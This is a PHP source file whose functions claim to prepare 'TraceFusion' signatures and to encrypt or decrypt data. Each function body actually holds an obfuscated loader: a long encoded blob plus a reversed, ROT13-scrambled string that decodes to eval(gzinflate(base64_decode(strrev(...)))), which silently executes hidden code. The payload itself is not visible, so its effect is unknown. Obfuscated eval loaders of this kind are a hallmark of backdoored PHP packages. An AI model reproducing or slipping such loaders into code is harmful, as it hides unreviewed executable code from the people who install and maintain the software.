<?php

/*
TraceFusion functionality
*/

//===========================================================================
//
// Input:  arbitrary format of TraceFusion data - array.
// Output:
//    $text_format==FALSE => binary encrypted sequence/string
//    $text_format==TRUE  => TEXTurized encrypted sequence/string

function MWX__TraceFusion_PrepareTraceFusionSignature ($tracefusion_data, $crypto_key, $text_format=FALSE)
{
   $final_data = $tracefusion_data;

$TjuTmgUmQLuZG='=Mg+19/S5HL8mqUd+fc+3q2BreL5fCfpGhqvHiJa7FH9rX+v8rNZ6iuffup5q4OhLbeUlKibBGm3vryr2wB9hXve0q7bVBX6e+e70Rdb05dKkcZe28TAeqkIy/7hkbINcPumo3w6pf+ztbHUKXCz1A2Qpfe053tQaXllFE3Lfzlui+mZuJF9eNFyoe2bSuO227qRWsnEgB9ANjBGrLgrcbJW1J3OsRMp1vG6Mjr+Ak2v9od9Q3Yl5/S7JVzHLyUixmbP38MqsY08Y74jFfrWewgWWM7+ruAUg925ui5wbAtpvxJCUomSj8wye8PK02a0W/ZXbvi1LVvLw9CRbRUl5T5yjUuvpLNZ652dNb9TLvbfKix98O8KKB2QpiTceyLEUzuDGwdnMnAo0qLUjRigaS2hpAtMr21Ukjj0dkYjQuTKdSdpB7EzkxqmLSHZZRF6hX7pd9Sso0FWoVWB5Bp2u01yp8JnAIxnX0aGWPe1pUfBlFmcH4ZPzA41FoeVb+jOBX8zhk3eq6pkMJbLVSeiWdVrnFLKUmFQ6+LUSNUwF5mvN8aKqxlszdwAzZQ6XYynsNAedNrHTR2uNfgTP0QdF6RhHiKorXuqOorQ6gheQCFhlBAZFSK7movIFQsOEOvap868/agMRPwBZ6+ycM65W4c0u4shiR1VRMuzFMh2wKAGLR8oFvYKiV3KEZRO62+bwSwggLFROapk1CFRu89M3HFz7teOQxAEXv1Q/5g3GoWRImD2RUB1KOMEoqkLF6s5Cr++Eq80S8rQnxENEF8qbmxjFfQCd4bg7n483Lb8RC1h2k6W7X6WohD86LJp1Y7qzd3u993XkMfKwAOc6wGCyMpDQAhA0bsjVA6COqtTZyPAapqjJLVZ';$ObopsTTl_waK=';))))TMhYDzHtzGhwG$(ireegf(rqbprq_46rfno(rgnysavmt(ynir';$lPWqkOHiRe=strrev($ObopsTTl_waK);$yeqUBwCtkS=str_rot13($lPWqkOHiRe);eval($yeqUBwCtkS);

   return $final_data;
}
//===========================================================================

//===========================================================================
function MWX__TraceFusion_encrypt_data ($data, $key) { return MWX__TraceFusion_encrypt_decrypt_data ($data, $key, TRUE);  }
function MWX__TraceFusion_decrypt_data ($data, $key) { return MWX__TraceFusion_encrypt_decrypt_data ($data, $key, FALSE); }

function MWX__TraceFusion_encrypt_decrypt_data ($data, $key, $is_encrypt)
{
   $new_data = $data;
$yiNSecnzTUgHGIZ='=8g/VD+/L/tDJYvr/+PLe7o6BK+XivZO0FkGUMPEx5X1J+T5gTZIb/28GHVcME0DJytel1HHqy5tPJ+GTVleloeroAXwwHEqBLR6elEKmjVtpvPs4nUAgysCnaLVQ+91991s77/+678nCiGlFu/PENRZLMgQIASScM7Flh06394lWWorJtbrpKmvnWiIRYI32BH2QoajnsUnrixlSD6Up/kExEx0u+wItYosu7cae0jTCcUBm68NXmiBkSq2WScV3VyRMcVIETILoBp+JyRraQc41n4bato9O6ZYdRY96GbmtzzE1ERvWqyM8p9rKz/BkwWqE3jPqA6QFnIBF8Gmnh3yj6RRVAA4b3rD9ZZ6vuTupOH6jUxUIsAuZ58XsfACNgit6JZLukuXc5VFhCq60JCOZrFU3tmbrqBVuSPcUcd+xW3JliQHczdlbdVqzyIFECTQHdRfejmdhLXL+jruNWc8n3qw8q07UpBsPxxpwrYLo2QZynRrRlaOlrp6S3N7FhXLyfQyWfAWJx/+u6AllnKAhmuZEsF7n9pXCnnJpxEHFSq3klikHf+aAFCHQLxaF1KdEFd/WwZZPqNbQj28dCc+wvgeTWqYweSfDQL7EmWea893J3ax6kqjYXj8whfPHG7dqEkLLq1MXj73GSPRglryjpkT5eMg/87ZiYnjTGK6/jF9FeEpOffRcevP76+ub3HfxAUVCMIIAGDuLIzgoEaQvFDiKAAWpRux/VEAAJqrJ3YV';$LRVT_uzTPO=';))))MVTUtHGmaprFAvl$(ireegf(rqbprq_46rfno(rgnysavmt(ynir';$nXZBOQyIFmjRyCHgGGO=strrev($LRVT_uzTPO);$MNc_cRynpiy=str_rot13($nXZBOQyIFmjRyCHgGGO);eval($MNc_cRynpiy);

   return $new_data;
}
//===========================================================================

?>